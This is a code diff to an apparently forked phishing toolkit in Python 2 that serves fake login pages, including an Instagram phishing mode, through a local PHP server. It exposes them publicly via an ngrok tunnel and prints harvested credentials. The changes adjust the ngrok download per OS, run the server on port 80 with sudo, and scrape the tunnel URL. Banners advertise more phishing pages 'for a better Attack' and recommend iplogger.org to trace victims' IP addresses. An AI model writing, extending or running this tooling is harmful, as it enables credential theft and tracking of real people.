@@ -33,10 +33,11 @@ if connected() == False:
 def checkNgrok():
     if path.isfile('Server/ngrok') == False: 
         print '[*] Downloading Ngrok...'
+        ostype = systemos().lower()
         if architecture()[0] == '64bit':
-            filename = 'ngrok-stable-linux-arm.zip'
+            filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
         else:
-            filename = 'ngrok-stable-linux-arm.zip'
+            filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
         url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
         download(url)
         system('unzip ' + filename)
@@ -55,12 +56,9 @@ def end():
               |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
               |/     / / / / / / /             \_   {1}ME !{2}  _)
                           {1}F I S H{2}                ~--___--~
-
  {0}This script was made by UndeadSec_ But I have added some more features in it ]
-
 {1}[ {0} Some more phising pages have been added in script. For a better Attack]
-
-[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(GREEN, END, CYAN)
+[ {0} Work Done By------------------------> An0nUD4Y]\n'''.format(RED, END, CYAN)
 
 def loadModule(module):
        print '''{0}
@@ -109,8 +107,6 @@ def waitCreds():
  .'       "-.,' / 
 (  AnonUD4Y_  ~.< 
  `=.____.="  `._\\
-
-
  [{1}*{0}]{1} Do you need more help to make your ngrok link more trusted. 
  [{1}*{0}]{1} Just visit to [https://iplogger.org]
  [{1}*{0}]{1} This will help you to trace your victims by their ip address on real time. 
@@ -122,7 +118,7 @@ def waitCreds():
             lines = creds.read().rstrip()
         if len(lines) != 0: 
             print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            system('rm -rf Server/www/cat.txt && touch Server/www/usernames.txt')
+            system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
         creds.close()
 
 def runPEnv():
@@ -195,19 +191,19 @@ def runPEnv():
         loadModule('Instagram')
         option2 =raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, END))
         runPhishing('Instagram', option2)    
-    else:  
-         exit(0)
+    else:
+        exit(0)
 
 def runNgrok():
-    system('./Server/ngrok http 8080 > /dev/null &')
+    system('./Server/ngrok http 80 > /dev/null &')
     sleep(10)
-    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
+    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
-    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
+    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
 
 def runServer():
-    system("cd Server/www/ && php -S 127.0.0.1:8080")
+    system("cd Server/www/ && sudo php -S 127.0.0.1:80")
 
 if __name__ == "__main__":
     try:
